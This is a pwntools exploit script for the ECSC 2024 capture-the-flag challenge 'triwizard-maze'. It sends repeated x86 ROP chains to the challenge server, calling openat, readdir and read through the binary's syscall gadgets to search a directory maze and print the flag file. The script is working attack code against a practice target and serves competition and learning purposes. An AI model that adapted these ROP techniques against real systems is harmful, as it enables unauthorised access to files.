#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=triwizard-maze.challs.external.open.ecsc2024.it' '--port=38202' triwizard-maze
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'triwizard-maze')
context.arch = 'i386'
context.kernel = 'amd64'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'triwizard-maze.challs.external.open.ecsc2024.it'
port = int(args.PORT or 38202)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
set follow-fork-mode parent
b *0x13371F82
b *0x13371f47
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x13370000)

MAX_BRANCH = 12 # take a look at the magestic find-max-branch.sh script
RECV_DIRNAME_BUF_SIZE = 128
OFF_NAME_DIRENT = 10

MAIN = 0x13371F86
READ_BUF = 0x13371f47
FILENAME_BUFF = 0x13375D60
DIRENT = 0x13375000 # need to be aligned
SYS_READ = 0x133723AF
SYS_OPENAT = 0x133725d0
SYS_WRITE = 0x133723C9
SYS_CALL = 0x1337233E
SYS_CLOSE = 0x133723E3
ROOT_DIR = b"/tmp/maze/entry"
TARGET = b"triwizard_cup"
dfd = 1

def find(children, filename):
    global dfd

    for child in children:
        rop = ROP(exe)
        log.info((b"\t" * (dfd-1)).decode() + child.decode())

        if child == filename:
            log.success("Found flag file")

            rop.call(SYS_READ, [0, FILENAME_BUFF, 100]) # zero out memory of the filename buffer
            rop.call(SYS_READ, [0, FILENAME_BUFF, len(child)])
            rop.call(SYS_OPENAT, [dfd, FILENAME_BUFF, constants.O_RDONLY, 0])   
            dfd += 1
            rop.call(SYS_READ, [dfd, FILENAME_BUFF, 255])
            rop.call(SYS_WRITE, [1, FILENAME_BUFF, 255])
            rop.call(SYS_CALL, [constants.SYS_exit, 0])

            payload = rop.chain()

            io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
            io.send(b"\x00" * 100) # zero out the memory of the filename so we don't have to handle null terminated strings here
            io.send(child)

            print(io.recvuntil(b"\x00", drop=True).decode())
            exit()


        rop.call(SYS_READ, [0, FILENAME_BUFF, 100]) # zero out memory of the filename buffer
        rop.call(SYS_READ, [0, FILENAME_BUFF, len(child)])

        if child == ROOT_DIR:
            rop.call(SYS_OPENAT, [constants.AT_FDCWD, FILENAME_BUFF, constants.O_RDONLY, 0])
        else:
            rop.call(SYS_OPENAT, [dfd, FILENAME_BUFF, constants.O_RDONLY, 0])   

        dfd += 1

        for i in range(MAX_BRANCH):
            rop.call(SYS_CALL, [constants.SYS_readdir, dfd, DIRENT, 0, 0, 0])
            rop.call(SYS_WRITE, [1, DIRENT, RECV_DIRNAME_BUF_SIZE])

        rop.raw(p32(READ_BUF))
        payload = rop.chain()

        assert(len(payload) < 1025)
        io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
        io.send(b"\x00" * 100) # zero out the memory of the filename so we don't have to handle null terminated strings here
        io.send(child)

        entries = set()
        for i in range(MAX_BRANCH):
            data = io.recv(RECV_DIRNAME_BUF_SIZE)
            namlen = u16(data[8:10])
            entries.add(data[OFF_NAME_DIRENT:OFF_NAME_DIRENT+namlen])

        entries.remove(b".")
        entries.remove(b"..")

        if entries:
            find(entries, TARGET)

        rop = ROP(exe)
        rop.call(SYS_CLOSE, [dfd])
        rop.raw(p32(READ_BUF))
        payload = rop.chain()
        io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
        dfd -= 1




io = start()

parent = set()
parent.add(ROOT_DIR)

find(parent, TARGET)

io.close()

